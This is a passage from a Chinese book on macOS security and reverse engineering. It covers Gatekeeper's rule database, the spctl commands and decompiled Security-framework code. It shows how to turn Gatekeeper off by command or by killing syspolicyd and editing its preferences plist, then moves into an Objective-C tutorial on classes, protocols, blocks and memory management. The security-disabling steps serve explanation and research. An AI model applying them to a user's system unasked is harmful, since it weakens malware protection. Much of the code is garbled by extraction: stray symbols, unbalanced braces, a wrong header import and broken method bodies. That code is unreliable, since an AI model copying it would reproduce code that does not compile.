从网上下载的程序第一次运行时，系统会弹出提示框展示下载程序的信息，如图2-11所示。

 </div>

当用户点击open后，以后打开就不需要再次确认了。

当用户设置只能运行从苹果商店下载的可信开发者开发的程序后, 系统会在程序启动时对软件进行安全检测, 安全检测依赖于软件的代码签名机制。

首先，系统会检测软件的签名是否有效，以此来判断是否被篡改，如果签名不对，系统会弹出提示框，让用户删除该程序，如图2-12所示。

 </div>

   </div>

如果软件的签名没有问题，系统会进入下一步的恶意代码检测。Gatekeeper基于规则来判断软件是否有害，规则文件位于/var/db/SystemPolicy文件中，是一个sqlite3数据库，由系统动态维护更新，可以使用任意的sqlite3管理工具打开，例如SQLPro for SQLite $ ^{①} $。所有的规则位于authority表中，如图2-13所示。

 </div>

表中的每一项都是一个Code Requirements，具体内容为requirement字段，目前支持anchor与cdhash这两种判断方式。如标识系统iBooks应用的requirement为：

anchor apple and identifier com.apple.iBooksX

标识一个苹果商店开发的程序为：

anchor apple generic and identifier com.your.program and certificate leaf[field.1.2.840.113635.100.6.1.13]

标识一个第三方的程序为：

cdhash H"9a6ce07bcf88643db2f1093981c30f5dbba7ce4b"

每个签名过的程序的cdhash值都是不同的，可以执行如下命令查看程序的cdhash值：

$ codesign -d -vvv /Applications/iBooks.app

Executable=/Applications/iBooks.app/Contents/MacOS/iBooks

Identifier=com.apple.iBooksX

Format=bundle with Mach-O thin (x86_64)

CodeDirectory v=20100 size=3126 flags=0x0(none) hashes=148+5 location=embedded

Platform identifier=1
Hash type=sha1 size=20
CDHash=03837053aca594ec2c408692ed91308d5724e5f1
Signature size=4105
Authority=Software Signing
Authority=Apple Code Signing Certification Authority
Authority=Apple Root CA
Info.plist entries=33
TeamIdentifier=not set
Sealed Resources version=2 rules=13 files=649
Internal requirements count=1 size=68

注意，命令行中是3个v参数，输出的CDHash一列就是iBooks程序的cdhash值。

每个requirement都有多个属性，包括：allow（是否允许）、disabled（是否禁用）、expires（过期时间）、priority（优先级）、label（标签名称），等等。

为了体现系统高度的可配置性，macOS提供了命令行工具spctl来控制Gatekeeper管理这些规则。执行如下命令可以关闭Gatekeeper:

$ sudo spctl --master-disable

执行如下命令可以查看Gatekeeper的状态：

$ sudo spctl --status
assessments enabled

往系统规则中添加一条规则可以执行如下命令：

$ sudo spctl --add --label "MyTest" ~/Downloads/MyTest.app

删除一条规则可以执行如下命令：

sudo spctl --remove --label "MyTest"

下面来探索一下开启与关闭Gatekeeper的原理。与分析Rootless一样，同样选择从管理工具入手，打开Hopper，将/usr/sbin/spctl拖入主界面进行分析。发现所有的控制操作最终都调用了SecAssessmentControl()。该函数位于系统Security Framework中。跟进分析Security中的代码，最终找到关键，如下所示：

int SecAssessmentControl(int arg0, int arg1, int arg2) {
    r15 = arg1;
    rbx = arg0;
    rdx = rbx;
    Security::CFTemp<_CFDictionary const*>::CFTemp(var_30, " {control=%0} ");
    r13 = var_30;
    esp_do_check("cs-assessment-control", r13);
    if (CFEqual(rbx, @"ui-enable") == 0x0) goto loc_ef5be;

    loc_ef57d:
    Security::CodeSigning::setAssessment(0x1);
    Security::CodeSigning::MessageTrace::MessageTrace(var_38, "com.apple.security.assessment.state");
    Security::CodeSigning::MessageTrace::send(var_38);
    asl_free(var_38);
}

goto loc_ef7dc;

loc_ef7dc:
rbx = 0x1;
if (r13 != 0x0) {
    CFRelease(r13);
}
rax = rbx & 0xff;
return rax;

loc_ef5be:
if (CFEqual(rbx, @"ui-disable") == 0x0) goto loc_ef60f;

loc_ef5d1:
Security::CodeSigning::setAssessment(0x0);
Security::CodeSigning::MessageTrace::MessageTrace(var_40, "com.apple.security.assessment.state");
Security::CodeSigning::MessageTrace::send(var_40);
asl_free(var_40);
goto loc_ef7dc;

loc_ef60f:
if (CFEqual(rbx, @"ui-status") == 0x0) goto loc_ef636;

loc_ef622:
if (Security::CodeSigning::overrideAssessment(0x0) != 0x0) {
    rax = _kCFBooleanFalse;
}
else {
    rax = _kCFBooleanTrue;
}
goto loc_ef7d6;

loc_ef7d6:
*r15 = *rax;
goto loc_ef7dc;

loc_ef636:
if (CFEqual(rbx, @"ui-enable-devid") == 0x0) goto loc_ef6e6;

loc_ef64d:
Security::CFTemp<_CFDictionary const*:::CFTemp(var_48, "%0=%s");
rax = Security::ModuleNexus<Security::CodeSigning::PolicyEngine>::operator();
rbx = var_48;
rax = Security::CodeSigning::PolicyEngine::enable(rax, 0x0, 0x0, 0x0, rbx);
if (rax != 0x0) {
    CFRelease(rax);
}
Security::CodeSigning::MessageTrace::MessageTrace(var_50, "com.apple.security.assessment.state");
Security::CodeSigning::MessageTrace::send(var_50);
asl_free(var_50);
if (rbx != 0x0) {
    CFRelease(rbx);
}
goto loc_ef7dc;

loc_ef6e6:
    if (CFEqual(rbx,◎"ui-disable-devid") == 0x0) goto loc_ef78f;

loc_ef6fd:
    Security::CFTemp<_CFDictionary const*:::CFTemp(var_58, "%0=%s");
    rax = Security::ModuleNexus<Security::CodeSigning::PolicyEngine>::operator();
    rbx = var_58;
    rax = Security::CodeSigning::PolicyEngine::disable(rax, 0x0, 0x0, 0x0, rbx);
    if (rax != 0x0) {
        CFRelease(rax);
    }
    Security::CodeSigning::MessageTrace::MessageTrace(var_60, "com.apple.security.assessment.state");
    Security::CodeSigning::MessageTrace::send(var_60);
    asl_free(var_60);
    if (rbx != 0x0) {
        CFRelease(rbx);
    }
    goto loc_ef7dc;

loc_ef78f:
    if (CFEqual(rbx,◎"ui-get-devid") == 0x0) goto loc_ef7fd;

loc_ef7a2:
    rax = Security::ModuleNexus<Security::CodeSigning::PolicyEngine>::operator();
    if (int Security::SQLite3::Database::value<int>(rax, "SELECT disabled FROM authority WHERE label = 'Developer ID';") != 0x0) {
        rax = _kCFBooleanFalse;
    }
    else {
        rax = _kCFBooleanTrue;
    }
    goto loc_ef7d6;

loc_ef7fd:
    if (CFEqual(rbx,◎"ui-record-reject") != 0x0) {
        Security::CodeSigning::xpcEngineRecord(r15);
    }
    else {
        if (CFEqual(rbx,◎"ui-record-reject-local") != 0x0) {
            rax = Security::ModuleNexus<Security::CodeSigning::PolicyEngine>::operator();
            Security::CodeSigning::PolicyEngine::recordFailure(rax, r15, rdx);
        }
        else {
            if (CFEqual(rbx,◎"ui-recall-reject") != 0x0) {
                r12 = Security::makeCFURL("/var/db/.LastGKReject", 0x0, 0x0);
                rbx = Security::cfLoadFile(r12);
                if (r12 != 0x0) {
                    CFRelease(r12);
                }
                if (rbx != 0x0) {
                    *r15 = Security::makeCFDictionaryFrom(rbx);
                    CFRelease(rbx);
                }
            }
        }
    }
}

else {
    *r15 = 0x0;
}
}
else {
    if (CFEqual(rbx, @"rearm-status") != 0x0) {
        if (Security::CodeSigning::queryRearmTimer(r15) == 0x0) {
            *r15 = 0x0;
        }
    }
    else {
        Security::MacOSError::throwMe(0xffffa06);
    }
}
}
goto loc_ef7dc;
}

开启与关闭Gatekeeper的方法是Security::CodeSigning::setAssessment()，代码如下：

int Security::CodeSigning::setAssessment(bool)(bool arg0) {
    r14 = arg0;
    rbx = Security::MutableDictionary::Create变色值Dictionary("var/db/SystemPolicy-prefs.plist");
    if (rbx == 0x0) {
        rbx = operator new(0x10);
        Security::MutableDictionary::变色值Dictionary();
    }
    rax = @"yes";
    Security::MutableDictionary::Value(rbx, @"enabled");
    Security::MutableDictionary::writePlistToFile(rbx);
    if (rbx != 0x0) {
        rax = *rbx;
        (*(rax + 0x8))(rbx);
    }
    chmod("var/db/SystemPolicy-prefs.plist", 0x1a4);
    notify_post("com.apple.security.assessment.masterswitch");
    rax = Security::CodeSigning::resetRearmTimer("masterswitch");
    return rax;
}

这段代码通过将/var/db/SystemPolicy-prefs.plist文件中enabled的值改为yes或no，来控制Gatekeeper的开启与关闭。下面尝试手动修改此值，看能否达到关闭Gatekeeper的效果。在修改前，需要在进程列表中关闭syspolicyd进程。按键盘上的control+space键，在弹出的Spotlight Search对话框中输入“Activity Monitor”并按回车，打开活动监视器，在进程列表中找到syspolicyd进程并双击，在弹出的对话框中点击“quit”结束进程，如图2-14所示。

 </div>

使用BBEdit文本编辑器打开/var/db/SystemPolicy-prefs.plist文件，将enable的值改为no，此时会提示文件需要解锁，输入用户密码解锁后保存退出，如图2-15所示。

 </div>

在命令行中执行spctl --status，此时可以看到Gatekeeper已经关闭了。打开系统的安全与隐私面板，可以看到，Allow apps downloaded from也变成Anywhere了。

在\_SecAssessmentControl()函数的代码中，还可以看到禁止某条规则是通过Security::CodeSigning::PolicyEngine::disable()方法完成的，开启则是通过Security::CodeSigning::

PolicyEngine::enable()方法完成的。它们实际上对应的是针对authority表执行sqlite语句UPDATE authority SET disabled = 1与UPDATE authority SET disabled = 0。

### 2.6 软件安全开发建议

安全是一个大的话题。对于应用层来说,安全意味着开发人员能够明确意识到代码如何使用,以及安全负责地使用它们。这可以概括为以下几点。

口 保护好用户隐私数据。很多软件安全的问题是由于应用开发者未能正确地保护用户的隐私数据，最终导致数据泄露，这在过去几年，不同的系统平台上（Android、iOS、Windows）都屡屡发生，这一类安全问题尤为突出。

□ 小心地处理不受信任的文件与数据。如果软件需要访问网络与读取存储文件，必须验证这些数据的内容；否则，将很可能给攻击者提供从外部攻击系统与用户隐私的入口。

☐ 数据传输安全。通过网络传输数据时，需要明确地验证通信方的身份与数据的完整性，否则将可能出现典型的中间人攻击（MITM）。

数据校验。如果处理的数据是经过签名的，必须验证数据签名的合法性，否则将可能出现数据伪造攻击，传输的敏感数据需要Token化并签名，保证每次传输只对当前会话有效，避免数据重放攻击。

对此，苹果官方的建议是多使用安全编码技术与系统的安全特性，避免软件受到攻击。

在开发的各个阶段，我们都应该注意以下问题，以减少潜在的风险。

避免可溢出的代码流。在代码功能实现的阶段，应该避免使用不安全的编码技术，因为它们极有可能会导致代码注入攻击、拒绝服务攻击或其他不正确的行为发生。

☐ 持续更新风险模型。在整个开发过程中，要持续地对软件进行风险评估，在软件迭代更新过程中，对软件可能存在的安全风险要有明确的了解。

避免重复造轮子。应该多使用系统内建的安全特性来构建程序，而不是自己动手造轮子。

口 数据安全。软件运行时需要判断用户的合法性，发送数据给外部服务器时，需要确保通信是安全的，保存到本地的数据需要做加密处理。

### 2.7 本章小结

本章主要讨论了macOS系统使用的一些安全技术与特点，讲解了macOS系统中的安全框架，分析了部分安全技术的原理。

技术人员了解系统的安全特性，对于软件安全开发和系统安全研究工作是十分必要的。在苹果官方没有公开技术细节的情况下，要掌握安全机制的运行原理，挖掘系统的安全漏洞，就需要用到软件逆向工程技术了。关于这些内容，我们将在后面讲解具体技术点时进一步展开。

# 软件开发基础

本章主要讲解macOS上常用的Objective-C与Swift开发语言，它们是大多数macOS软件开发人员所使用的编辑语言。如果读者已经掌握了这部分内容，那么可以直接跳过，学习其他章节。

所谓“逆向”工程，本质上就是通过阅读代码一点一点地还原软件原作者的想法与思路。所以，一个合格的逆向工程师必须熟悉各种“正向”的开发技术，才能在逆向分析的时候做出准确的判断，理解原作者的思想，达到事半功倍的效果。此外，学习开发基础还可以掌握查阅资料的方法，从而解决逆向中遇到的技术难点。

本章首先简单介绍在macOS系统上进行软件开发的一些常用的编程语言，然后介绍macOS系统中的常用框架，最后，通过开发一个完整的基于Cocoa框架的GUI程序来说明在macOS系统上软件开发的一般步骤。

### 3.1 Objective-C 语言

Objective-C是目前在macOS上进行开发的首选语言，也是macOS上大多数基础框架的开发语言。Objective-C是C语言的一个超集，在C语言的基础上添加了面向对象、消息机制以及反射等特性，最初NeXT Computer公司使用该语言作为主要语言来实现NeXTSTEP操作系统。后来苹果公司收购了NeXT，并将NeXTSTEP系统中的大量组件融入到了macOS中，Objective-C也就顺理成章地成为了在macOS上开发的首选语言。

此外还有对C++进行扩展而产生的语言Objective-C++，不过该语言应用比较少，此处不作讨论。

#### 3.1.1 开发环境

开发Objective-C最常用的开发环境应该非Xcode莫属了，Xcode可以直接从App Store上免费下载，安装过程很简单，只需要在App Store中搜索Xcode，点击安装即可。安装完Xcode后，就可以使用它来开发软件了，安装过程如下所示。

(1) 打开Xcode，首先出现的是欢迎界面，如图3-1所示。

 </div>

(2) 选择 “Create a new Xcode project”，出现选择工程模板的界面，如图3-2所示。

 </div>

(3) 这里只是为了学习Objective-C的语法，暂时不会用到界面，所以先新建一个命令行工程。在界面左侧选择macOS下的“Application”子项，然后在右侧选择“Command Line Tool”图标，点击“Next”按钮，来到工程选项设置界面，如图3-3所示。

 </div>

(4) 项目名称和组织名称等可以根据自己的需求填写。将工程名设置为 “learn_oc”；使用的语言选择 “Objective-C”，点击 “Next”，会提示选择项目的保存路径，选定路径后点击 “Create” 按钮，工程就创建成功了，然后就来到了Xcode的主界面，如图3-4所示。

 </div>

以后的代码编写工作主要就是在该程序基础上进行的。在左侧可以看到Xcode创建了一个main.m源文件，点击选中，可以在中间的编辑器中看到该文件的内容。

#import <Foundation/Foundation.h>

int main(int argc, const char * argv[]) {
    @autoreleasepool {
        // insert code here...
        NSLog(@"Hello, World!");
    }
    return 0;
}

即使没有学习过Objective-C，也应该可以看出这是一段经典的“Hello World”代码，不做任何修改直接点击左上角的运行按钮（▷）编译并运行该代码，可以看到在下方的输出窗口中打印了一句“Hello World!”，与C语言printf版的Hello World相比，唯一的不同是多了时间等信息。

#### 3.1.2 Objective-C 语言特性

有了开发环境，就可以开始学习Objective-C了。Objective-C完全兼容标准C语言，所以正常的C代码可以直接当成Objective-C代码进行编译。本书假设读者已经熟悉标准的C语言，因此会重点探讨Objective-C在C语言基础上新添加的特性。而且，Objective-C本身经历过多次版本更新，有许多语言特性和语法在新版本中已经被替换掉了，对于已经过时的语法，本书也不会介绍。

# 1. Hello world解析

在前面的小节中已经搭建好了Objective-C的开发环境，并且Xcode自动生成了Hello world工程，接下来简单分析一下它的代码。

(1) 代码的开始部分是一些注释，接下来是一个import预处理。Objective-C中的import与C语言中的include十分相似，唯一的不同是import会自动防止重复包含。Foundation.h中包含的是macOS系统提供的基础框架的接口声明，与Windows下编程中的windows.h类似。

(2) 接下来是熟悉的C语言的入口点main函数，Objective-C的入口点与C是完全一样的。

(3)@autoreleasepool是Objective-C中用于管理内存的机制，在@autoreleasepool包含的代码块中申请内存位于本线程的一个自动释放内存池上，会在内存池销毁的时候自动回收。在软件开发中，内存管理一直是一个比较复杂的问题，下一节会简单介绍Objective-C中内存回收的几种方案。

(4) 接下来的NSLog一行则是真正的输出“Hello world”字符串的代码。NSLog函数与C语言中的printf函数非常相似，用于向控制台输出文字。与printf最主要的不同是，它接收的第一个参数是一个NSString，而不是const char；在Objective-C中，NSString的字面量只在C的字符串字面量的前面加了一个@符号。NSString不像C的字符串那样只是个char数组，而是一个类，功能上比C的字符串更强。

# 2. 类

类是面向对象编程中最重要的概念。在Objective-C中，强制要求将类分为声明（interface）与实现（implementation）两部分。声明部分存放在.h头文件中，实现部分则放在.m文件中，类似于C的.h和.c文件。

下面给之前新建的learn_oc工程添加一些类，逐步演示Objective-C中类的用法和特性。

创建一个MyObject类。可以手动创建一个.h文件和一个.m文件，并在其中编写类的定义和实现代码，但是这样做会比较繁琐，Xcode提供了更加简单的方式。右击Xcode左侧的“Project Navigator”中的“main.m”（或者“main.m”的上层文件夹），弹出上下文菜单，在菜单中选择“New File”，弹出一个与选择工程模板相似的对话框，用来选择要创建的文件类型，如图3-5所示。

 </div>

选择 “Cocoa Class”，点击 “Next”，来到设置类的具体属性界面，如图3-6所示。

   </div>

 </div>

将类命名为“MyObject”，父类选择“NSObject”。Objective-C中绝大多数类都直接或间接继承自NSObject，该基类跟初始化和垃圾回收等基础特性有关，暂时不用去深究。语言选择“Objective-C”，点击“Next”，选择生成的文件保存路径，点击“Create”结束向导。

可以看到Xcode生成了MyObject.h和MyObject.m两个文件，并根据设置生成了一部分代码。这两个文件就是类的框架。

MyObject.h文件如下：

#import <Foundation/Foundation.h>
@interface MyObject : NSObject
@end

MyObject.m文件如下：

#import "Shape.h"
@implementation MyObject
@end

现在给类添加一些属性和消息处理方法。

MyObject.h如下：
#import <Foundation/Foundation.h>
@interface MyObject : NSObject
@property int intProp;

@property(勉) NSString* strProp;
- (id)initWithProp:(int)intProp andProp:(NSString*)strProp;
- (NSString*)toString;
- (void)oneArgtest:(int)arg;
- (void)twoArgTest:(int)arg1 with:(int)arg2;
@end
MyObject.m如下：
#import "MyObject.h"
@implementation MyObject
- (id)initWithProp:(int)intProp andProp:(NSString*)strProp{
    if(self = [super init])
    {
        _intProp = intProp;
        _strProp = strProp;
    }
    return self;
}
- (NSString*)toString;
return [NSString stringWithFormat:“intProp is %d, strProp is %@”, self.intProp, self.strProp]
- (void)oneArgtest:(int)arg{
    NSLog(@"oneArgtest, arg is %d", arg);
}
- (void)twoArgTest:(int)arg1 with:(int)arg2{
    NSLog(@"twoArgTest, arg1 is %d, arg2 is %d", arg1, arg2);
}
@end
修改main.m，如下所示：
#import <Foundation/Foundation.h>
#import "MyObject.h"
int main(int argc, const char * argv[]) {
    @autoreleasepool {
        MyObject* myobj = [[MyObject alloc] initWithProp:1 andProp:“test”];
        myobj.intProp = 123;
        //myobj.strProp = @"fuck"; //这一句会导致编译错误：Assignment to readonly property
        NSLog(@"%d, %@", myobj.intProp, myobj.strProp);
        NSLog(@"myobj tostring is: %@", [myobj tostring]);
        [myobj oneArgtest:1];
        [myobj twoArgTest:1 with:2];
    }
}

return 0;
运行后的输出结果为：
2016-04-24 22:31:19.624 learn_oc[3160:300952] 123, fuck
2016-04-24 22:31:19.625 learn_oc[3160:300952] myobj tostring is: intProp is 123, strProp is fuck
2016-04-24 22:31:19.625 learn_oc[3160:300952] oneArgtest, arg is 1
2016-04-24 22:31:19.625 learn_oc[3160:300952] twoArgTest, arg1 is 1, arg2 is 2
Program ended with exit code: 0

在MyObject.h的5~6行定义了两个属性。在Objective-C中，成员变量一般使用@property关键字添加。@property本质上是一个语法糖，它由编译器进行展开，并根据括号中的属性生成相应的成员变量（属性名前加下划线）和getter、setter等，在对属性赋值和取值的时候会自动调用getter和setter。

如果手动展开@property int intProp;这一句，代码大体如下：

// MyObject.h

@interface MyObject : NSObject {
    int _intProp;
}

// MyObject.m

@implementation MyObject

-(int)intProp{
    return _intProp;
}

-(void)setIntProp:(int) intProp {
    _intProp = intProp;
}

效果与直接写@property基本上相同，也可以通过myobj.intProp的方式对其进行取值赋值操作，不过@property后面的括号中的属性不同，可能生成的代码也不尽相同，编译器会自动添加一些与锁和内存管理相关的代码，此处就不详细说明了。

在MyObject.h的8~12行声明了3个成员函数，并在MyObject.m中实现了它们，然后在main函数中调用了这些方法。不过在Objective-C里，更准确的说法应该是向该对象发送消息，方法的实现则被视为对消息的回应，但是很多时候还是会将消息称为方法。在Objective-C中可以对对象发送任意消息，如果对象中没有该消息的处理方法，并不会导致编译错误，而是会触发一个运行时异常。

这样做显然是有意义的——可以用此特性来实现“鸭子类型”。在Objective-C中有一个特殊的类型id，与C的void较为类似，不过它只能用来存放对象实例的指针。可以向id类型的实例发

送任意消息而不必关心其具体类型，当然前提是要确认该实例有对应的消息处理方法。

initWithProp()方法较为特殊，它用来初始化MyObject的实例。一般实例化一个类的做法是先调用alloc()方法分配内存，然后调用init()方法进行初始化。这两个方法均继承自NSObject，如果想要在初始化的时候做一些事情，则需要重写init()方法。init()方法的返回值类型是id。

# 3. 协议

Objective-C中的协议类似于C++中的虚函数，要求子类实现特定接口的一种语法。协议分为正式协议和非正式协议，二者的区别是正式协议会强制子类实现协议中的接口，非正式协议则不会。

在新的语法中，Objective-C引入了新的关键字@optional，使得正式协议也可以实现非正式协议的功能，于是非正式协议已经不建议使用。

定义协议的关键字@protocol，中间为方法列表。

@protocol Foo
@optional - (void)doSomething;
- (void)doSomethingWithArg:(int)arg;
@end

一个类要实现某个协议的方法是将该协议的名字放到继承的父类之后的尖括号中：@interface MyObject : NSObject<Foo>。实现协议中的方法时，并不需要在类的声明中再次声明该方法，直接在.m文件中实现该方法即可。

# 4. 类别

类别（Category）主要用来扩展一个类。很多时候无法修改类的代码，但是却需要为类增加一些功能，此时就需要类别。

类别的定义方式与类的定义非常相似，假设要扩展MyObject类，为其添加一个打印功能，就可以这样操作，创建PrintExt.h和PrintExt.m两个文件，代码如下：

//PrintExt.h
#import <Foundation/Foundation.h>
#include "MyObject.h"

@interface MyObject(PrintExt)
-(void)print;

@end

//PrintExt.m
#import "PrintExt.h"

@implementation MyObject(PrintExt)
-(void)print{
    NSLog(@ "%@", [self toString]);
}

@end

然后在需要使用该扩展的地方包含PrintExt.h头文件，并向MyObject的实例发送print消息，即可调用print的代码。需要注意的是，类别中的方法优先级更高，如果类别中的方法和原类中的方法重复，在类别可见时只会调用类别中的方法。

# 5. block语法

block语法主要是为了方便地处理一些需要回调函数的场景而设计的。block语法在其他语言中一般称为匿名函数或Lambda表达式，Lambda表达式最初常见于各种函数式编程语言，后来各种新出的语言中都包含了这种特性。

C++在C++11标准中增加了Lambda语法，Java则是在Java 8标准中增加了Lambda语法，可见该语法的使用还是比较广泛的。Objective-C的新版本中也添加了这一特性，其语法如图3-7所示。

 </div>

①部分声明了一个变量testBlock，它用来存放匿名函数。这部分的语法与C语言中的声明函数指针很类似，但是在变量前面加了一个“^”符号。

②③部分则定义了一个block，②的“^”表示这是一个block，后面紧接参数列表，③部分是函数体，函数体中可以直接使用外部变量，但要注意引用类型变量的生命周期。block的返回值类型由函数体中的return语句自动推导出来，不需要明确地写出来。

捕获的外部变量foo在block中是无法进行修改的，如果要对其进行修改，则对变量的定义有一定的要求，必须是以下3种类型的变量之一。

☐ 变量是全局变量；

☐ 变量是静态变量；

☐ 变量前有__block修饰符，比如将foo定义成__block int foo。

#### 3.1.3 内存管理

几乎在所有编程语言中，内存管理机制都是最重要但又很难解决的一个问题，Objective-C也不例外。

Objective-C中有引用计数、垃圾回收（GC）和自动引用计数（ARC）这3种管理内存的方法。其中引用计数方式是最早也是最原始的内存管理方式，需要程序员手动管理引用计数，而GC与ARC则是较为现代的内存管理方式。这3种内存管理方式有各自的优缺点，下面进行详细介绍。

需要注意的是，内存管理只针对Objective-C类对象的管理，C代码中的内存管理不受影响，仍为传统的C内存管理方式。

在进行详细的讨论之前，先定义一个类，用来产生需要回收的对象。

//MyObject.h
#import <Foundation/Foundation.h>

@interface MyObject : NSObject

@property (readonly) int objId;

-(id)initWithId:(int) objId;

@end

//MyObject.m
#import "MyObject.h"

@implementation MyObject

-(id)initWithId:(int) objId{
    if(self = [super init])
    {
        _objId = objId;
    }
    return self;
}

-(void)dealloc{
    NSLog(@"dealloc, objId=%d", _objId);
    [super dealloc];
}

@end

dealloc函数与C++的析构函数类似，当一个对象实例被销毁时自动调用。在对象初始化时为其指定一个ID，并在销毁时打印出ID，方便查看对象何时销毁。后面的代码将默认工程中已经包含MyObject.h和MyObject.m两个文件。

# 1. 引用计数

引用计数的核心思想很简单，就是为每一个对象维护一个引用计数器，每当多一个引用时，需要将引用计数加1，不再使用时则减1，当引用计数为0时则销毁该对象。

#import <Foundation/Foundation.h>
#import "MyObject.h"

int main(int argc, const char * argv[]) {
    MyObject* obj1 = [[MyObject alloc]initWithId:1];
    NSLog(@"obj1 ref count = %lu", [obj1 retainCount]);
    [obj1 release];
    return 0;
}

Xcode 4.2及之后的版本默认开启了ARC，因此需要手动关闭才能编译以上这段代码。在项目的“Build Setting”中将“Objective-C Automatic Reference Counting”选项设置为“No”即可关闭ARC。

编译并运行这段代码，输出结果如下:

2016-05-05 00:26:17.888 test_arc[1938:119272] obj1 ref count = 1
2016-05-05 00:26:17.889 test_arc[1938:119272] dealloc, objId=1
Program ended with exit code: 0

当创建一个类的实例时，它的引用计数为1，retainCount()方法会返回当前的引用计数，而release()方法则会减少引用计数，因此调用release()方法时obj1指向的对象将会被析构。

如果要为对象新增一个引用并增加对象的引用计数，需要使用`retain()`方法：

MyObject* obj1 = [[MyObject alloc]initWithId:1];
NSLog(@"obj1 ref count = %lu", [obj1 retainCount]);
MyObject* obj2 = obj1;
[obj2 retain];
NSLog(@"obj1 ref count = %lu", [obj1 retainCount]);
[obj1 release];
NSLog(@"obj1 ref count = %lu", [obj1 retainCount]);
[obj2 release];

输出结果为：

2016-05-05 00:38:20.937 test_arc[1986:122695] obj1 ref count = 1
2016-05-05 00:38:20.937 test_arc[1986:122695] obj1 ref count = 2
2016-05-05 00:38:20.937 test_arc[1986:122695] obj1 ref count = 1
2016-05-05 00:38:20.937 test_arc[1986:122695] dealloc, objId=1

在Hello World的代码中，大家应该记得有一个@autoreleasepool块，这也是与内存管理相关的。当声明一个@autoreleasepool块时，会自动创建一个NSAutoreleasePool对象，块中的对象可以使用autorelease()方法将自己提交给NSAutoreleasePool对象进行管理，当退出块作用域时，NSAutoreleasePool对象会被销毁，pool上管理的对象将会自动调用release()方法将引用计数减1。

@autoreleasepool {
    MyObject* obj1 = [[MyObject alloc]initWithId:1];
    [obj1 autorelease];
    NSLog(@"in @autoreleasepool");
}
NSLog(@"out of @autoreleasepool");

输出结果为：

2016-05-05 00:49:29.254 test_arc[2045:125960] in @autoreleasepool
2016-05-05 00:49:29.255 test_arc[2045:125960] dealloc, objId=1

2016-05-05 00:49:29.255 test_arc[2045:125960] out of @autoreleasepool

前面提到的类的属性@property也与内存管理相关，根据定义属性时括号中的参数，编译器会自动添加相关的代码。括号中可以添加的参数如表3-1所示。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>参数类别</td><td style='text-align: center; word-wrap: break-word;'>参 数</td><td style='text-align: center; word-wrap: break-word;'>说 明</td></tr><tr><td rowspan="2">原子性</td><td style='text-align: center; word-wrap: break-word;'>atomic</td><td style='text-align: center; word-wrap: break-word;'>对属性加锁，多线程下线程安全，对方问速度有影响，默认值</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>nonatomic</td><td style='text-align: center; word-wrap: break-word;'>不加锁，非线程安全，不影响速度</td></tr><tr><td rowspan="2">可读写性</td><td style='text-align: center; word-wrap: break-word;'>readwrite</td><td style='text-align: center; word-wrap: break-word;'>生成getter和setter方法，外部可对属性进行读写操作，默认值</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>readonly</td><td style='text-align: center; word-wrap: break-word;'>只生成getter方法，外部只能读取属性</td></tr><tr><td rowspan="3">setter方法的处理</td><td style='text-align: center; word-wrap: break-word;'>assign</td><td style='text-align: center; word-wrap: break-word;'>直接赋值，默认值</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>retain</td><td style='text-align: center; word-wrap: break-word;'>先release原来的值，再retain新值</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>copy</td><td style='text-align: center; word-wrap: break-word;'>先release原来的值，再copy新值</td></tr></table>

手动管理引用计数的优点和缺点都十分明显,优点是所有对象的生命周期都可以由程序员精确把握,缺点则是过于繁琐,容易出错。

# 2. 垃圾回收

关于Objective-C的垃圾回收，一般情况下可以理解为与Java、C#等语言的垃圾回收机制相同。当一个对象不再使用时，垃圾回收机制会自动将其回收，在写代码时不必关心对象和内存的回收。Ovjective-C的垃圾回收在新版本的Xcode中已不再支持，此处不再详细讨论。

# 3. 自动引用计数

自动引用计数（ARC）是目前最常用的Objective-C内存管理方式，本质上仍是引用计数的方式，但是不需要手动添加管理引用计数的代码，编译器会在适当的位置自动添加这些代码，并且这些方法（包括查看引用计数的retainCount()方法）也无法再显式地进行调用。

在ARC模式下，对对象的引用分为4种类型，分别用不同的修饰符进行区分。

□ _strong

□ _weak

☐  $ \underline{\text{unsafe}} $unretained

□ autoreleasing

如果不加修饰符，默认是_strong。_strong和_weak修饰的指针可以理解为C++中的shared_ptr和weak_ptr智能指针。当对象赋值给一个strong指针时，编译器会自动添加retain()方法为该对象增加引用计数；当指向其他对象时，则自动添加release()减少引用计数。

在开启ARC的情况下，我们编写如下代码：

int main(int argc, const char * argv[]) {
    MyObject* obj1 = [[MyObject alloc] init];
}

MyObject* obj2 = [[MyObject alloc] init];
obj1 = obj2;
NSLog(@"Do something...");
return 0;
}

在这段代码中，并没有手工编写内存管理相关的代码，但是obj1和obj2实际上是可以正常释放的。这是因为编译器为我们自动添加了内存管理相关的代码，这段代码等同于关闭ARC时的如下代码：

int main(int argc, const char * argv[]) {
    MyObject* obj1 = [[MyObject alloc] initWithId:1];
    MyObject* obj2 = [[MyObject alloc] initWithId:2];
    [obj1 release];
    [obj2 retain];
    obj1 = obj2;
    NSLog(@"Do something...");
    [obj2 release];
    [obj1 release];
    return 0;
}

并且，ARC模式下的MyObject的dealloc()方法也不再需要手工调用[super dealloc]，也是由编译器自动添加的。

weak指针主要是为了解决环状引用的问题而设计的。如果两个对象互相持有对方的_strong指针，那么可以肯定这两个对象将无法释放。_weak类型的指针与_strong指针最大的不同之处在于它不会增加所持有对象的引用计数，解除引用时也不会减少引用计数，并且当它指向的对象被释放时，指针值将会自动变成nil。

_unsafe_unretained类型的指针与没有启用ARC时的指针几乎是一样的, 它不会对引用计数产生影响, 也不会在所指向的对象被释放时自动变成nil——这种类型的指针在ARC模式下的应用场景极少, 而且苹果官方也不推荐使用这种指针, 这从它的名字上也能看出一二。

最后一种指针较为复杂，它需要与@autoreleasepool配合使用。在ARC模式下@autoreleasepool依然可用，但是前面已经说过autorelease()方法不可用了，那如何使用@autoreleasepool呢？答案就是配合_autoreleasing类型的指针使用。

在开启ARC的情况下编写如下代码：

@autoreleasepool {
    __autoreleasing MyObject* obj = [[MyObject alloc] init];
}

这段代码的效果等同于关闭ARC时的以下代码：

@autoreleasepool {
    MyObject* obj = [[MyObject alloc] init];
    [obj autorelease];
}

初看这样做没有什么意义，反正没有autoreleasepool，ARC也会帮我们释放对象，为什么要将对象添加到autoreleasepool中进行管理呢？

考虑一下如下场景：

for (int i = 0; i < 1000; ++i) {
    MyObject* obj = [[MyObject alloc] init];
}

